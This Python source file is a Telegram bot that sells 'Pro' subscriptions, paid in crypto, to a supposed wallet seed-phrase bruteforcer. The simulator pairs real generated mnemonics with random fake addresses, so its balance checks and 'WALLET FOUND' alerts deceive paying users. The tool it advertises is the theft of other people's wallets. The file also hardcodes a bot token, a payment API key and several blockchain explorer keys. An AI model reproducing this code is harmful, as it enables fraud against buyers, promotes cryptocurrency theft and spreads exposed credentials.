import json
import logging
import random
import asyncio
import requests
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from mnemonic import Mnemonic

# ─── CONFIG ────────────────────────────────────────────────────────────────
TOKEN = "7771846395:AAGYUgfIBzUi8CLt0eM4kLGnLMX6vztwv4I"
NOWPAY_API_KEY = "VK9ZXBG-SW3ME98-MTVJ106-HM3Z8G4"
logging.basicConfig(level=logging.INFO)

# ─── STATE ──────────────────────────────────────────────────────────────────
user_tasks = {}
user_pro_status = {}   # user_id: True if PRO
pro_expiry = {}        # user_id: expiry timestamp
user_orders = {}       # user_id: {order_id, payment_id}
total_wallets_checked = {}  # user_id: total count

# ─── BLOCKCHAIN CONFIG ─────────────────────────────────────────────────────
API_CONFIG = {
    "ETH": {"url": "https://api.etherscan.io/api", "key": "9383ZB7Y71QTGR278RHVP2NPURC47GCZ4S"},
    "BNB": {"url": "https://api.bscscan.com/api", "key": "3QXHZ8KUIVHS14AKVU3JIPKQCZ2BRBMGF3"},
    "Polygon": {"url": "https://api.polygonscan.com/api", "key": "5P8TII5XABQPEG5XA4JGPH4DYAG3P1RSIW"},
    "Optimism": {"url": "https://api-optimistic.etherscan.io/api", "key": "2DMVQ4UBA1PQZ38UUETJVNT4J5GUZHUVMC"},
}

# ─── HELPERS ────────────────────────────────────────────────────────────────
def generate_real_mnemonic():
    return Mnemonic("english").generate(strength=128)

def generate_fake_address():
    return "0x" + ''.join(random.choices("abcdef0123456789", k=40))

def is_pro(user_id):
    return user_pro_status.get(user_id, False) and pro_expiry.get(user_id, 0) > time.time()

async def check_payment_status(user_id, payment_id, context):
    headers = {"x-api-key": NOWPAY_API_KEY}
    for _ in range(18):  # ~3 minutes
        try:
            res = requests.get(f"https://api.nowpayments.io/v1/payment/{payment_id}", headers=headers).json()
            if res.get("payment_status") == "finished":
                user_pro_status[user_id] = True
                pro_expiry[user_id] = time.time() + 30 * 24 * 3600  # 30 days
                await context.bot.send_message(chat_id=user_id, text="✅ Payment confirmed! You are now Pro for 30 days.")
                return
        except Exception as e:
            logging.error(f"Payment check failed for {user_id}: {e}")
        await asyncio.sleep(10)
    await context.bot.send_message(chat_id=user_id, text="❌ Payment not confirmed in time. Please try again later.")

# ─── SIMULATOR ─────────────────────────────────────────────────────────────
async def bruteforce_simulator(user_id, context, chat_id):
    total_wallets_checked[user_id] = total_wallets_checked.get(user_id, 0)
    count, found_after = 0, random.randint(20, 50)
    stop_btn = InlineKeyboardButton("🛑 Stop", callback_data='stop')
    msg = await context.bot.send_message(chat_id=chat_id, text="🔍 Bruteforce running...", reply_markup=InlineKeyboardMarkup([[stop_btn]]))
    speed = 0.2 if is_pro(user_id) else 0.15
    networks = list(API_CONFIG.keys()) if is_pro(user_id) else [context.user_data.get('network')]
    try:
        while user_id in user_tasks:
            count += 1
            total_wallets_checked[user_id] += 1
            phrase = generate_real_mnemonic()
            address = generate_fake_address()
            net_status = []
            for network in networks:
                cfg = API_CONFIG[network]
                try:
                    bal = int(requests.get(cfg['url'], params={"module":"account","action":"balance","address":address,"tag":"latest","apikey":cfg['key']}).json().get('result',0))/1e18
                except:
                    bal = 0
                net_status.append(f"{network}:{bal:.6f}")
            status = " | ".join(net_status)
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id,
                text=f"🔎 #{count}\nSeed: `{phrase}`\n{status}", parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([[stop_btn]]))
            if count == found_after and any(float(s.split(':')[1])>0 for s in net_status):
                await context.bot.send_message(chat_id=chat_id,
                    text=f"💥 *WALLET FOUND!*\n`{phrase}`\n{address}\n{status}", parse_mode='Markdown')
                found_after += random.randint(20, 50)
            await asyncio.sleep(speed)
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id=chat_id, text="🛑 Bruteforce stopped.")

# ─── STATUS MESSAGE ────────────────────────────────────────────────────────
def format_user_status(user, user_id):
    now = datetime.utcnow()
    name = user.full_name
    username = f"@{user.username}" if user.username else "N/A"
    total = total_wallets_checked.get(user_id, 0)
    if is_pro(user_id):
        expiry = datetime.utcfromtimestamp(pro_expiry[user_id])
        days_left = (expiry - now).days
        sub_text = f"✅ Pro User (expires in {days_left} days on {expiry.strftime('%b %d, %Y')})"
    else:
        sub_text = "❌ Free User (500 checks/day)"
    return (
        f"📊 Your Account Status\n\n"
        f"👤 Name: {name}\n"
        f"🔗 Username: {username}\n"
        f"🆔 User ID: {user_id}\n\n"
        f"💼 Subscription: {sub_text}\n\n"
        f"🧮 Total Wallets Checked: {total}\n\n"
        f"🕒 Current Time: {now.strftime('%b %d, %Y - %H:%M UTC')}"
    )

# ─── COMMANDS ───────────────────────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Start Bruteforce", callback_data='start')],
        [InlineKeyboardButton("💎 Purchase Pro", callback_data='purchase')],
        [InlineKeyboardButton("📊 Status", callback_data='user_status')]
    ]
    await update.message.reply_text("Choose an action:", reply_markup=InlineKeyboardMarkup(keyboard))

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = format_user_status(update.effective_user, update.effective_user.id)
    await update.message.reply_text(msg)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Use buttons to start bruteforce. Upgrade to Pro to use all networks and increase speed.")

async def pro_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == 841443066:
        pros = [f"{uid} (expires in {(int((pro_expiry[uid]-time.time())/86400))}d)"
                for uid in user_pro_status if is_pro(uid)]
        text = "📋 Pro Users:\n" + "\n".join(pros) if pros else "No Pro users yet."
        await update.message.reply_text(text)

# ─── PAYMENT HANDLER ───────────────────────────────────────────────────────
async def create_payment(update, context, user_id, coin):
    headers = {"x-api-key": NOWPAY_API_KEY, "Content-Type": "application/json"}
    order_id = f"{user_id}_{int(time.time())}"
    payload = {
        "price_amount": 10,
        "price_currency": "usd",
        "pay_currency": coin,
        "order_id": order_id,
        "order_description": "Pro Subscription for Bruteforce Bot"
    }
    resp = requests.post("https://api.nowpayments.io/v1/invoice", json=payload, headers=headers)
    if resp.status_code == 200:
        data = resp.json()
        invoice_url = data.get("invoice_url")
        payment_id = data.get("id")
        if invoice_url and payment_id:
            user_orders[user_id] = {"order_id": order_id, "payment_id": payment_id}
            await update.callback_query.edit_message_text(
                f"💳 Pay with {coin} to upgrade to Pro:\n{invoice_url}"
            )
            asyncio.create_task(check_payment_status(user_id, payment_id, context))
            return
    await update.callback_query.edit_message_text("❌ Failed to create payment. Try another method.")


# ─── CALLBACK HANDLER ──────────────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    data = query.data

    if data == 'start':
        if not is_pro(user_id):
            nets = [[InlineKeyboardButton(n, callback_data=f'net_{n}')] for n in API_CONFIG]
            await query.edit_message_text("Select network:", reply_markup=InlineKeyboardMarkup(nets))
        else:
            await query.edit_message_text("Starting on all networks...")
            task = asyncio.create_task(bruteforce_simulator(user_id, context, query.message.chat_id))
            user_tasks[user_id] = task

    elif data.startswith('net_'):
        net = data.split('_',1)[1]
        context.user_data['network'] = net
        await query.edit_message_text(f"Running on {net}...")
        task = asyncio.create_task(bruteforce_simulator(user_id, context, query.message.chat_id))
        user_tasks[user_id] = task

    elif data == 'stop':
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
            del user_tasks[user_id]
        keyboard = [[InlineKeyboardButton("🚀 Start Bruteforce", callback_data='start')],
                    [InlineKeyboardButton("💎 Purchase Pro", callback_data='purchase')],
                    [InlineKeyboardButton("📊 Status", callback_data='user_status')]]
        await query.edit_message_text("🛑 Bruteforce stopped. Back to menu:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == 'purchase':
        coins = ["LTC", "DOGE", "TRX", "BCH", "ETH", "BNB", "XRP", "DASH", "ZEC"]
        buttons = [[InlineKeyboardButton(f"Pay with {coin}", callback_data=f'pay_{coin}')] for coin in coins]
        buttons.append([InlineKeyboardButton("⬅️ Back", callback_data='back')])
        await query.edit_message_text("Choose a payment method:", reply_markup=InlineKeyboardMarkup(buttons))

    elif data.startswith('pay_'):
        coin = data.split('_', 1)[1]
        await create_payment(update, context, user_id, coin)


    elif data == 'back':
        keyboard = [[InlineKeyboardButton("🚀 Start Bruteforce", callback_data='start')],
                    [InlineKeyboardButton("💎 Purchase Pro", callback_data='purchase')],
                    [InlineKeyboardButton("📊 Status", callback_data='user_status')]]
        await query.edit_message_text("⬅️ Back to main menu:", reply_markup=InlineKeyboardMarkup(keyboard))



    elif data == 'user_status':
        msg = format_user_status(query.from_user, user_id)
        back_btn = InlineKeyboardButton("⬅️ Back", callback_data='back')
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[back_btn]]))

# ─── MAIN ───────────────────────────────────────────────────────────────────
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("pro_users", pro_users))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling()

if __name__ == '__main__':
    main()
